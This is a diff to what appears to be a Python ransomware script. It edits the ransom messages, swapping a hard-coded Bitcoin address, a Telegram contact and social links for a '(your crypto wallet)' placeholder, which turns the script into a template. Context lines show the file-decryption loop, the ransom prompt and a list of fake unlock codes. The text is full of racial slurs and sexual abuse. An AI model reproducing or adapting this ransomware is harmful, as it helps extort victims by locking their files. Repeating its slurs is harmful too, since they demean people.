@@ -29,7 +29,7 @@ W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
 .~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
 Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
 $R@i.~~ !     :   ~$$$$$B$$en:``
-?MXT@Wx.~    :     ~"##*$$$$M~  Choke on this dick bitch.\nAll of your files have been ENCRYPTED..\nSend 1 Bitcoin to this adress to unlock them ══► bc1qhqmk0qmsqr3y77rea9w92d896m5mx3r3tm5kwh\nContact me here if you're poor: https://t.me/riphoes\n╔══Credits\n╚══►NC , Kxrma.\n╔══Socials\n╚══►https://clippy.link/sex , https://github.com/whoresmad , https://www.youtube.com/NT""", Colors.red, interval=0.001)
+?MXT@Wx.~    :     ~"##*$$$$M~  Choke on this dick bitch.\nAll of your files have been ENCRYPTED..\nSend 1 Bitcoin to this adress to unlock them ══► (your crypto wallet)""", Colors.red, interval=0.001)
 
 
 files = []
@@ -48,7 +48,7 @@ with open("thekey.key", "rb") as key:
 
 tosniggersex = ["i use dm de goo. ."],["i like sucking dicks im gay asf!"],["cheese crakeeeeez"],["zaaaaaaaaaaaaaaaaaeeeeeeeeeeeeeeellllllllllllllllllllll pro hgaxor 1357 #1337!."],["tos_nigger cheeks"],[".Kxrma Owns M3 v430998982769286geigj"],["UIHgyrg9873oyghuiiuhzrhg95yg3g3"],["prosecuritykey.cum8489627692876298"]
 
-tos_sex = Write.Input("╔══Enter the code to decrypt your juicy files.\n╚══► ", Colors.red, interval=1)
+tos_sex = Write.Input("╔══Enter the decryption code.\n╚══► ", Colors.red, interval=1)
 
 if tos_sex == tosniggersex:
     for file in files:
@@ -59,4 +59,4 @@ if tos_sex == tosniggersex:
                    thefile.write(contents_decrypted)
             Write.Input("Congrats, you're files are now decrypted. Enjoy them and don't fall anymore for malicious files bbby <3.", Colors.green, interval=1)
 else:
-        Write.Input("Wrong key, send me more btc. ~~> bc1qhqmk0qmsqr3y77rea9w92d896m5mx3r3tm5kwh", Colors.purple, interval=0.1)
+        Write.Input("Wrong key, send me more btc. ~~> (your crypto wallet)", Colors.purple, interval=0.1)
